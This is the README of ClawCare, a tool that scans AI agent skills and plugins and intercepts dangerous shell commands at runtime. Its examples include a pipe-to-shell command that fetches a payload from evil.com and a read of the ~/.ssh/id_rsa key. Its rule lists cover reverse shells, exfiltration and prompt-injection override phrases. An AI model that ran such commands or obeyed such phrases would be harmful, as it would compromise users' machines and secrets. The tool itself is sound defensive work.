# ClawCare

<p align="center">
  <img src="https://github.com/natechensan/ClawCare/blob/main/clawcare.png?raw=true" alt="ClawCare" width="200" />
</p>

***Run AI agents with care - OpenClaw, Claude Code and more***

ClawCare is a multi-platform security tool to prevent AI agent skills, plugins and instructions from attacks. It scans and reports supply-chain threats like command injection, credential theft, and data exfiltration. It also provides **runtime command interception** (ClawCare Guard) that blocks dangerous commands before they execute. Use it as a CLI tool, integrate into CI/CD, or install as a hook/plugin for your agent platform.

[![OpenClaw](https://img.shields.io/badge/OpenClaw-plugin-blue?logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PC9zdmc+)](https://docs.openclaw.ai/tools/plugin)
[![Claude Code](https://img.shields.io/badge/Claude_Code-hooks-blueviolet?logo=anthropic&logoColor=white)](https://docs.anthropic.com/en/docs/claude-code)
[![Codex](https://img.shields.io/badge/Codex-supported-green?logo=openai&logoColor=white)](https://github.com/openai/codex)
[![Cursor](https://img.shields.io/badge/Cursor_Agent-supported-orange?logo=cursor&logoColor=white)](https://www.cursor.com/)
[![License](https://img.shields.io/badge/License-Apache_2.0-red.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.10+-yellow?logo=python&logoColor=white)](https://www.python.org/)

## Why

AI coding agents (Claude Code, Cursor, Codex, OpenClaw) let you install third-party skills and plugins that can read your files, run commands, access secrets and extract sensitive data. A malicious skill can:

- Pipe remote scripts into your shell (`curl ... | bash`)
- Steal SSH keys and API tokens
- Set up cron persistence
- Transfer PII data to external servers

ClawCare catches these patterns **before** they run — both statically (scanning files) and at runtime (intercepting commands) — and gives you full visibility into the risks.

## Demo

See ClawCare in action:

👉 **[ClawCare Demo](https://github.com/natechensan/ClawCare-demo)** — static scan, runtime guard, CI blocking, and custom adapters.

## Quick Start

### Install

```bash
pip install clawcare
```

## Features

### ClawCare Scan

```bash
# Scan a project — auto-detects the platform
clawcare scan .

# CI mode — exit code 2 on HIGH+ findings (use in GitHub Actions)
clawcare scan . --ci

# JSON output for downstream tooling
clawcare scan . --format json --json-out report.json
```

### Example Output

```
============================================================
ClawCare Scan Report
============================================================
Path:     ./my-project
Adapter:  claude_code v0.1.0
Mode:     ci
Fail on:  high

── CRITICAL (2) ──
  [CRIT_PIPE_TO_SHELL] skills/setup/SKILL.md:15
    curl -fsSL https://.../install.sh | bash
    → Piping remote content directly into a shell interpreter.
    ✎ Download first, inspect, then execute.

  [CRIT_CREDENTIAL_PATH] skills/setup/exfil.py:18
    os.path.expanduser("~/.ssh/id_rsa")
    → Accessing well-known credential paths.
    ✎ Use a secrets manager instead.

Findings: 2 critical, 1 high, 0 medium, 0 low
============================================================
```

### ClawCare Guard — Runtime Command Interception

ClawCare Guard intercepts commands **at runtime** — before the agent executes them. Currently supports Claude Code and OpenClaw.

#### Quick Start

```bash
# Install hooks for Claude Code
clawcare guard activate --platform claude

# Install plugin for OpenClaw
clawcare guard activate --platform openclaw

# Check status
clawcare guard status --platform claude
```

Once activated, every Bash/shell command the agent tries to run is scanned against ClawCare's rulesets. Dangerous commands are blocked; warnings are logged.

```
# Agent tries to run:
#   curl -fsSL https://evil.com/payload.sh | bash
#
# ClawCare output:
# [CRITICAL] CRIT_PIPE_TO_SHELL: Piping remote content into shell
# ⛔ ClawCare BLOCKED: curl -fsSL https://evil.com/payload.sh | bash
```

#### Audit Trail

Every command decision (allow / warn / block) is logged to a JSONL audit file.

```bash
# View recent events
clawcare guard report --since 24h

# Only blocked/warned commands
clawcare guard report --only-violations

# JSON format for tooling
clawcare guard report --format json --since 7d
```

#### How It Works

| Platform | Mechanism | Hook Type |
|----------|-----------|----------|
| **Claude Code** | `PreToolUse` / `PostToolUse` hooks with matcher objects in `~/.claude/settings.json` | `{"type": "command", "command": "..."}` |
| **OpenClaw** | TypeScript plugin installed to `~/.openclaw/extensions/` | `before_tool_call` / `after_tool_call` via plugin API |

#### Platform-Specific Behavior

When a command triggers a finding **below** the `fail_on` severity (e.g. a medium finding with `fail_on: high`), the behavior depends on the platform:

| Platform | Behavior | Why |
|----------|----------|-----|
| **Claude Code** | **Ask** — pauses and prompts the user to allow or deny the command, with the warning displayed | Claude Code's hook system supports a `permissionDecision: "ask"` response that hands control to the user |
| **OpenClaw** | **Allow with warning** — the command proceeds, but a warning message is printed for the agent to see | OpenClaw's `before_tool_call` hook only supports block or allow; there is no interactive prompt mechanism |

Commands at or above `fail_on` severity are **blocked** on both platforms.

#### Deactivate

```bash
clawcare guard deactivate --platform claude
clawcare guard deactivate --platform openclaw
```

---

### Platform Adapters for Claude Code, OpenClaw, Codex and Cursor Agent Skills

Auto-detects the AI agent platform and scans the right files:

| Platform | Scans | Detection |
|----------|-------|-----------|
| **Claude Code** | `.claude/skills/*/SKILL.md` + code | `.claude-plugin/`, `SKILL.md` |
| **Cursor** | `.cursor/rules/*.mdc`, `.cursorrules` + skills | `.cursor/` directory |
| **Codex** | `AGENTS.md`, `AGENTS.override.md` + skills | `AGENTS.md` |
| **OpenClaw** | `SKILL.md` + code in skill directories | `.opencode/` |

All following the file structure of the respective AI agent platforms.

Only plugin and skill files are scanned — your application code, README, and CI configs are never touched.

### Configuration

All settings for both **scan** and **guard** live in one file: `.clawcare.yml`.

#### Resolution Order

ClawCare resolves configuration in priority order:

| Priority | Location | Purpose |
|----------|----------|----------|
| 1 (highest) | CLI flags | One-off overrides |
| 2 | `.clawcare.yml` in project root | Team policy, checked into version control |
| 3 | `~/.clawcare/config.yml` | Personal defaults across all projects |
| 4 (lowest) | Built-in defaults | Sane zero-config behavior |

Project-level values override user-level values. CLI flags override both.

#### Full Reference

Drop a `.clawcare.yml` in your project (or `~/.clawcare/config.yml` for global defaults):

```yaml
# .clawcare.yml — project-level config (or ~/.clawcare/config.yml for personal defaults)
scan:
  fail_on: high              # minimum severity to block CI (critical | high | medium | low)
  block_local: false         # block locally too? (default: warn only)
  ignore_rules:
    - MED_JS_EVAL            # suppress specific rules
  exclude:
    - "vendor/**"            # skip directories
  max_file_size_kb: 512      # skip large files
  rulesets:
    - default                # built-in rules (always included)
    - ./my-custom-rules      # add your own

guard:
  fail_on: high              # minimum severity to block commands (low | medium | high | critical)
  audit:
    enabled: true
    log_path: "~/.clawcare/history.jsonl"
```

CLI flags override config values. Excludes and rulesets from both sources merge.

### Policy Manifests

Skills/Plugins can declare their permissions in a `clawcare.manifest.yml`:

```yaml
permissions:
  exec: none           # no shell execution
  network: allowlist   # only listed domains
  filesystem: read_only
  secrets: none
  persistence: forbidden

allowed_domains:
  - api.anthropic.com
```

ClawCare enforces these declarations — violations appear as HIGH/CRITICAL findings.

### Custom Rulesets

Create your own rules as YAML:

```yaml
rules:
  - id: MY_NO_INTERNAL_URLS
    pattern: "https://internal\\.corp\\.com"
    severity: high
    description: "References to internal URLs should not appear in extensions."
    recommendation: "Use environment variables for internal endpoints."
```

Place in a folder, then: `clawcare scan . --ruleset ./my-rules`

### Custom Adapters

ClawCare supports custom adapters for scanning any AI agent platform. An adapter implements four methods:

```python
# my_adapter.py
from clawcare.models import ExtensionRoot

class MyAdapter:
    name = "my_platform"
    version = "0.1.0"
    priority = 50

    def detect(self, target_path: str) -> float:
        """Return 0.0–1.0 confidence that this adapter applies."""
        ...

    def discover_roots(self, target_path: str) -> list[ExtensionRoot]:
        """Return extension roots to scan."""
        ...

    def scan_scope(self, root: ExtensionRoot) -> dict:
        """Return include/exclude globs for this root."""
        return {
            "include_globs": ["*.md", "*.py", "*.yml"],
            "exclude_globs": [".git", "node_modules"],
        }

    def default_manifest(self, root: ExtensionRoot) -> str | None:
        """Return path to clawcare.manifest.yml, or None."""
        return None
```

Use it via import string:

```bash
clawcare scan path/ --adapter import:my_adapter:MyAdapter
```

Or register permanently via entry point in your `pyproject.toml`:

```toml
[project.entry-points."clawcare.adapters"]
my_platform = "my_adapter:MyAdapter"
```

See [`clawcare/adapters/base.py`](clawcare/adapters/base.py) for the full protocol, or any of the [built-in adapters](clawcare/integrations/) for real examples.

### Built-in Rules

Three rulesets ship by default, organized by attack category:

| Ruleset | Catches |
|---------|--------|
| `execution-abuse` | Pipe-to-shell, reverse shells, credential theft, persistence, destructive commands, subprocess abuse |
| `data-exfiltration` | Hardcoded AWS keys, SSH keys, API tokens, SSN/credit card numbers, IP addresses, env-variable exfiltration |
| `prompt-injection` | Instruction override, role hijacking, ignore-previous-instructions patterns |

All rules include [CWE](https://cwe.mitre.org/) references where applicable. Rules are used by both the static scanner and the runtime guard.

## CI Integration

### GitHub Actions

```yaml
- name: Install ClawCare
  run: pip install clawcare

- name: Scan for malicious extensions
  run: clawcare scan . --ci
```

## CLI Reference

```
clawcare scan <path> [OPTIONS]

Options:
  --ci                    CI mode (exit 2 on findings above threshold)
  --fail-on SEVERITY      Minimum severity to block: critical|high|medium|low (default: high)
  --block-local           Block locally too (default: warn only, exit 0)
  --format FORMAT         Output format: text|json (default: text)
  --json-out FILE         Write JSON report to file
  --adapter NAME          Force a specific adapter (default: auto-detect)
  --ruleset PATH          Additional rulesets (repeatable)
  --exclude GLOB          Exclude glob patterns (repeatable)
  --max-file-size-kb N    Skip files larger than N KB
  --manifest MODE         Manifest enforcement: auto|skip|strict (default: auto)

clawcare adapters list    List registered adapters
```

### Guard CLI

```
clawcare guard run -- <COMMAND>       Scan and execute a command (wrapper mode)
  --fail-on SEVERITY                  Minimum severity to block (default: from config or high)
  --dry-run                           Scan only — do not execute
  --config PATH                       Path to guard config file

clawcare guard activate               Install hooks/plugin for a platform
  --platform claude|openclaw
  --settings PATH                     Path to settings file (auto-detected if omitted)
  --project                           Install at project level (Claude only)

clawcare guard deactivate             Remove hooks/plugin
  --platform claude|openclaw

clawcare guard status                 Check whether hooks are installed
  --platform claude|openclaw

clawcare guard report                 Query audit history
  --since DURATION                    Relative time (e.g. 24h, 30m, 7d) or ISO timestamp
  --only-violations                   Show only events with findings
  --format text|json                  Output format (default: text)
  --limit N                           Max events to show (default: 100)
  --log-path PATH                     Override audit log path

clawcare guard hook                   (internal) Handle a platform hook event
  --platform claude|openclaw
  --stage pre|post
```

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for development instructions.

## License

[Apache 2.0](LICENSE)
